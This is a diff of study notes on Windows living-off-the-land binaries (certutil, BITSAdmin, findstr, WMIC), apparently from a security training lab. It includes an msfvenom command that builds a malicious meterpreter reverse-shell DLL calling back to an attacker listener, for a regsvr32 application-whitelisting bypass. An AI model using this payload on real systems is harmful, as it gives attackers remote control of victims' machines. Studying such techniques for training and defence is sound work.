@@ -17,20 +17,20 @@ FindStr Options:
 
 
 Informational:
-Certutil is a Windows built-in utility for handling certification services. It is used to dump and display Certification Authority (CA) configuration information and other CA components.
+  Certutil is a Windows built-in utility for handling certification services. It is used to dump and display Certification Authority (CA) configuration information and other CA components.
 
-BITSAdmin - System administrator utility that can be used to create, download or upload Background Intelligent Transfer Service (BITS) jobs and check their progress.
+  BITSAdmin - System administrator utility that can be used to create, download or upload Background Intelligent Transfer Service (BITS) jobs and check their progress.
 
-Findstr is a Microsoft built-in tool used to find text and string patterns in files. 
+  Findstr is a Microsoft built-in tool used to find text and string patterns in files. 
 
-Windows Management Instrumentation (WMIC) is used to execute binaries for evading defensive measures. The MITRE ATT&CK framework refers to this technique as Signed Binary Proxy Execution (T1218).
+  Windows Management Instrumentation (WMIC) is used to execute binaries for evading defensive measures. The MITRE ATT&CK framework refers to this technique as Signed Binary Proxy Execution (T1218).
 
-
+  Application Whitelisting is a Microsoft endpoint security feature that prevents malicious and unauthorized programs from executing in real-time.
 
 
 
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f dll -a x86 > live0fftheland.dll
-                                Create a malicious DLL file using `msfvenom` and set up our  Metasploit listener to receive a reverse shell
+                                Create a malicious DLL file using `msfvenom` and set up our Metasploit listener to receive a reverse shell
                                 Note that we will be creating a malicious file that works for 32bit operating systems. We will be using the `regsvr32.exe`
                                 Application Whitelisting Bypass technique to run a command on a target system.
                                 We specified the output type as `DLL` using the `-f` argument
